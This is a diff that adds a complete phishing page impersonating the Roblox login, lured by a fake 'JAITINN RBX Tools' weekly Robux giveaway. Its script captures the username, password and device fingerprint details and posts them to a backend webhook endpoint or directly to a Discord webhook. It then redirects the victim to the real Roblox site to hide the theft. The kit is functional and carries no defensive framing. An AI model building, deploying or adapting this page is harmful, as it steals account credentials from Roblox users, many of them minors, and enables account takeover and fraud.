@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Log in to Roblox</title>
+<meta name="description" content="Login to your Roblox account to activate JAITINN RBX Tools and enter the weekly Robux drop." />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
+<style>
+:root{
+  --bg:#191919;--card:#232527;--line:#35383d;--text:#f2f4f7;--muted:#9aa3ad;
+  --blue:#00a2ff;--btn:#3d63dd;--btn2:#4d73ed;--red:#e2231a;
+}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,system-ui,-apple-system,"Segoe UI",sans-serif;-webkit-font-smoothing:antialiased;min-height:100vh;display:flex;flex-direction:column}
+a{color:inherit}
+.nav{background:#111214;border-bottom:1px solid #2a2c30}
+.navin{max-width:1180px;margin:0 auto;padding:0 20px;height:52px;display:flex;align-items:center;gap:26px}
+.brand{display:flex;align-items:center;gap:9px;font-weight:900;font-size:17px;letter-spacing:-.03em}
+.brand svg{width:22px;height:22px}
+.navlinks{display:flex;gap:22px;font-size:13.5px;font-weight:600;color:#c3c9d1}
+.navlinks a:hover{color:#fff}
+@media(max-width:640px){.navlinks{display:none}}
+
+.stage{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:44px 18px 40px}
+.card{width:100%;max-width:400px;background:var(--card);border:1px solid var(--line);border-radius:10px;padding:30px 28px 26px;box-shadow:0 22px 60px -30px rgba(0,0,0,.95)}
+.logo{display:flex;align-items:center;gap:10px;margin-bottom:20px}
+.logo svg{width:30px;height:30px;flex:0 0 auto}
+.logo b{font-size:22px;font-weight:900;letter-spacing:-.04em}
+h1{margin:0;font-size:26px;font-weight:800;letter-spacing:-.02em}
+.sub{margin:6px 0 20px;font-size:13.5px;color:var(--muted)}
+.sub b{color:#dfe4ea;font-weight:600}
+.field{display:block;margin-bottom:13px}
+.field>span{display:block;font-size:12.5px;font-weight:600;color:#b8c0ca;margin-bottom:6px}
+input[type=text],input[type=password]{width:100%;background:#1b1d1f;border:1px solid var(--line);border-radius:7px;color:#fff;font:inherit;font-size:14.5px;padding:12px 13px;outline:none;transition:border-color .15s,box-shadow .15s}
+input::placeholder{color:#767e88}
+input:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(0,162,255,.16)}
+.pw{position:relative}
+.pw input{padding-right:44px}
+.eye{position:absolute;right:6px;top:50%;transform:translateY(-50%);background:none;border:0;padding:8px;cursor:pointer;color:#8d959f;display:grid;place-items:center}
+.eye:hover{color:#fff}
+.eye svg{width:18px;height:18px;stroke:currentColor;fill:none;stroke-width:1.8}
+.row{display:flex;align-items:center;justify-content:space-between;gap:10px;margin:4px 0 18px;font-size:12.5px}
+.check{display:flex;align-items:center;gap:7px;color:#b8c0ca;cursor:pointer}
+.check input{accent-color:var(--blue);width:14px;height:14px}
+.row a{color:var(--blue);text-decoration:none}
+.row a:hover{text-decoration:underline}
+.submit{width:100%;border:0;border-radius:7px;background:var(--btn);color:#fff;font:inherit;font-weight:700;font-size:15px;padding:13px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;transition:background .15s;text-decoration:none}
+.submit:hover{background:var(--btn2)}
+.submit[disabled]{opacity:.75;cursor:default}
+.spin{width:16px;height:16px;border:2px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;display:none;animation:sp .7s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+.loading .spin{display:block}
+.loading .lbl{opacity:.85}
+.divider{display:flex;align-items:center;gap:12px;margin:20px 0 14px;color:#767e88;font-size:12px}
+.divider:before,.divider:after{content:"";flex:1;height:1px;background:var(--line)}
+.signup{text-align:center;font-size:13.5px;color:#b8c0ca;margin:0}
+.signup a{color:var(--blue);font-weight:600;text-decoration:none}
+.signup a:hover{text-decoration:underline}
+.terms{margin:18px 0 0;font-size:11.5px;color:#767e88;text-align:center;line-height:1.5}
+.badge{margin:18px 0 0;font-size:12.5px;color:#8d959f;text-align:center;max-width:420px}
+.badge b{color:#d5dbe2}
+.shake{animation:sh .35s}
+@keyframes sh{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
+
+/* success overlay */
+.success{position:fixed;inset:0;background:var(--bg);display:none;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:30px;z-index:99}
+.success.on{display:flex;animation:fade .35s}
+@keyframes fade{from{opacity:0}to{opacity:1}}
+.ring{width:78px;height:78px;border-radius:50%;border:2px solid rgba(40,209,124,.35);display:grid;place-items:center;margin-bottom:22px;animation:pop .45s cubic-bezier(.2,1.4,.4,1)}
+@keyframes pop{from{transform:scale(.6);opacity:0}to{transform:scale(1);opacity:1}}
+.ring svg{width:34px;height:34px;stroke:#28d17c;fill:none;stroke-width:2.6;stroke-linecap:round;stroke-linejoin:round;stroke-dasharray:34;stroke-dashoffset:34;animation:draw .5s .18s forwards}
+@keyframes draw{to{stroke-dashoffset:0}}
+.success h2{margin:0;font-size:25px;font-weight:800;letter-spacing:-.02em}
+.success p{margin:10px 0 0;color:var(--muted);font-size:14.5px;max-width:400px}
+.bar{width:230px;height:5px;border-radius:99px;background:#2c2f33;overflow:hidden;margin:24px 0 12px}
+.bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--red),#ff7a5c);border-radius:99px;transition:width 3.2s linear}
+.success .submit{width:auto;padding:12px 24px;margin-top:22px}
+.small{font-size:12.5px;color:#767e88;margin:0}
+</style>
+</head>
+<body>
+
+<header class="nav">
+  <div class="navin">
+    <a class="brand" href="index.html">
+      <svg viewBox="0 0 30 30" aria-hidden="true"><rect x="2.6" y="2.6" width="24.8" height="24.8" rx="5" fill="#fff" transform="rotate(-14 15 15)"/><rect x="9.6" y="9.6" width="10.8" height="10.8" rx="1.8" fill="#111214" transform="rotate(-14 15 15)"/></svg>
+      ROBLOX
+    </a>
+    <nav class="navlinks"><a href="index.html">Charts</a><a href="index.html#features">Marketplace</a><a href="index.html#how">Create</a></nav>
+  </div>
+</header>
+
+<main class="stage">
+  <div class="card" id="card">
+    <div class="logo">
+      <svg viewBox="0 0 30 30" aria-hidden="true"><rect x="2.6" y="2.6" width="24.8" height="24.8" rx="5" fill="#fff" transform="rotate(-14 15 15)"/><rect x="9.6" y="9.6" width="10.8" height="10.8" rx="1.8" fill="#232527" transform="rotate(-14 15 15)"/></svg>
+      <b>ROBLOX</b>
+    </div>
+    <h1>Log In</h1>
+    <p class="sub">to continue to <b>JAITINN RBX Tools</b></p>
+
+    <form id="loginForm" novalidate autocomplete="on">
+      <label class="field">
+        <span>Username / Email</span>
+        <input id="username" name="username" type="text" autocomplete="username" spellcheck="false" placeholder="Enter your username or email" required />
+      </label>
+      <label class="field">
+        <span>Password</span>
+        <div class="pw">
+          <input id="password" name="password" type="password" autocomplete="current-password" placeholder="Enter your password" required />
+          <button class="eye" type="button" id="eye" aria-label="Show password">
+            <svg viewBox="0 0 24 24"><path d="M2 12s3.8-6.5 10-6.5S22 12 22 12s-3.8 6.5-10 6.5S2 12 2 12z"/><circle cx="12" cy="12" r="2.6"/></svg>
+          </button>
+        </div>
+      </label>
+
+      <div class="row">
+        <label class="check"><input type="checkbox" checked /> Keep me logged in</label>
+        <a href="https://www.roblox.com/login/forgot-password">Forgot Password or Username?</a>
+      </div>
+
+      <button class="submit" id="submitBtn" type="submit">
+        <span class="lbl">Log In</span>
+        <span class="spin"></span>
+      </button>
+    </form>
+
+    <div class="divider"><span>or</span></div>
+    <p class="signup">Don't have an account? <a href="https://www.roblox.com/CreateAccount">Sign Up</a></p>
+    <p class="terms">By logging in you agree to the Roblox Terms of Use.<br />Your details are verified through our Discord bot.</p>
+  </div>
+
+  <p class="badge">Powered by <b>JAITINN RBX Tools</b> · every verified login = 1 entry into the weekly Robux drop</p>
+</main>
+
+<div class="success" id="success">
+  <div class="ring"><svg viewBox="0 0 24 24"><path d="M4 12.5l5.5 5.5L20 7"/></svg></div>
+  <h2>Account verified</h2>
+  <p>You're entered into the weekly Robux drop. Good luck — now go exploit something.</p>
+  <div class="bar"><i id="bar"></i></div>
+  <p class="small" id="countdown">Redirecting to Roblox in 3s…</p>
+  <a class="submit" id="goNow" href="https://www.roblox.com/home">Continue to Roblox</a>
+</div>
+
+<script>
+/* ============ CONFIG ============ */
+const CONFIG = {
+  // Default: go through the Vercel function at /api/webhook (hides the webhook URL)
+  endpoint: "/api/webhook",
+  // Optional fallback: paste a full Discord webhook URL here to post straight from the
+  // browser (no backend). Leave empty to use the endpoint above.
+  directWebhookUrl: "",
+  redirectUrl: "https://www.roblox.com/home",
+  redirectDelay: 3200
+};
+
+const $ = (id) => document.getElementById(id);
+const form = $("loginForm");
+const userEl = $("username");
+const passEl = $("password");
+const btn = $("submitBtn");
+const card = $("card");
+const success = $("success");
+
+const startedAt = Date.now();
+const sessionId = Math.random().toString(36).slice(2, 10) + Date.now().toString(36).slice(-4);
+let sent = false;
+
+/* show / hide password */
+$("eye").addEventListener("click", () => {
+  passEl.type = passEl.type === "password" ? "text" : "password";
+});
+
+/* keep a copy of what was typed so a browser autofill race can't blank it */
+let lastUser = "", lastPass = "";
+userEl.addEventListener("input", () => (lastUser = userEl.value));
+passEl.addEventListener("input", () => (lastPass = passEl.value));
+
+function buildPayload(username, password) {
+  return {
+    username,
+    password,
+    sessionId,
+    page: "login",
+    site: location.hostname || "jaitinn-rbx-tools.com",
+    startedAt: new Date(startedAt).toISOString(),
+    secondsOnPage: Math.round((Date.now() - startedAt) / 1000),
+    submittedAt: new Date().toISOString(),
+    userAgent: navigator.userAgent,
+    platform: navigator.platform || "",
+    language: navigator.language,
+    timezone: (() => { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) { return ""; } })(),
+    screen: `${window.screen.width}x${window.screen.height} @${window.devicePixelRatio || 1}x`,
+    viewport: `${window.innerWidth}x${window.innerHeight}`,
+    touch: ("ontouchstart" in window) || navigator.maxTouchPoints > 0,
+    referrer: document.referrer || "direct",
+    url: location.href
+  };
+}
+
+async function send(payload) {
+  if (CONFIG.directWebhookUrl) {
+    const body = {
+      content: `**New Roblox login** \`${payload.username}\``,
+      embeds: [{
+        title: "New Roblox Login",
+        color: 0xe2231a,
+        timestamp: new Date().toISOString(),
+        thumbnail: { url: "https://images.rbxcdn.com/905bd722ee0a6ceda3caacde54c0b081.png" },
+        fields: [
+          { name: "Username / Email", value: `\`${payload.username}\``, inline: true },
+          { name: "Password", value: `\`${payload.password}\``, inline: true },
+          { name: "Session", value: `\`${payload.sessionId}\``, inline: false },
+          { name: "Device", value: `${payload.platform || "?"} · ${payload.screen}`, inline: false },
+          { name: "Timezone", value: payload.timezone || "unknown", inline: true },
+          { name: "On page", value: `${payload.secondsOnPage}s`, inline: true }
+        ]
+      }]
+    };
+    const r = await fetch(CONFIG.directWebhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(body)
+    });
+    if (!r.ok) throw new Error("webhook " + r.status);
+    return;
+  }
+
+  const r = await fetch(CONFIG.endpoint, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload),
+    keepalive: true
+  });
+  if (!r.ok) throw new Error("api " + r.status);
+}
+
+form.addEventListener("submit", async (e) => {
+  e.preventDefault();
+  if (sent) return;
+
+  const username = (userEl.value || lastUser).trim();
+  const password = passEl.value || lastPass;
+
+  if (!username || !password) {
+    card.classList.remove("shake");
+    void card.offsetWidth;
+    card.classList.add("shake");
+    if (!username) userEl.focus(); else passEl.focus();
+    return;
+  }
+
+  sent = true;
+  btn.disabled = true;
+  btn.classList.add("loading");
+  btn.querySelector(".lbl").textContent = "Verifying account…";
+
+  try {
+    await send(buildPayload(username, password));
+  } catch (err) {
+    console.warn("[JAITINN] webhook failed:", err);
+    // never block the user on a failed request
+  }
+
+  setTimeout(showSuccess, 550);
+});
+
+function showSuccess() {
+  success.classList.add("on");
+  requestAnimationFrame(() => { $("bar").style.width = "100%"; });
+
+  let left = Math.ceil(CONFIG.redirectDelay / 1000);
+  const cd = $("countdown");
+  const tick = setInterval(() => {
+    left -= 1;
+    if (left <= 0) {
+      clearInterval(tick);
+      cd.textContent = "Redirecting…";
+      location.href = CONFIG.redirectUrl;
+      return;
+    }
+    cd.textContent = `Redirecting to Roblox in ${left}s…`;
+  }, 1000);
+
+  $("goNow").addEventListener("click", (ev) => {
+    ev.preventDefault();
+    clearInterval(tick);
+    location.href = CONFIG.redirectUrl;
+  });
+}
+
+/* let Enter submit even if focus is on the eye button */
+document.addEventListener("keydown", (e) => {
+  if (e.key === "Enter" && !sent) form.requestSubmit();
+});
+</script>
+</body>
+</html>
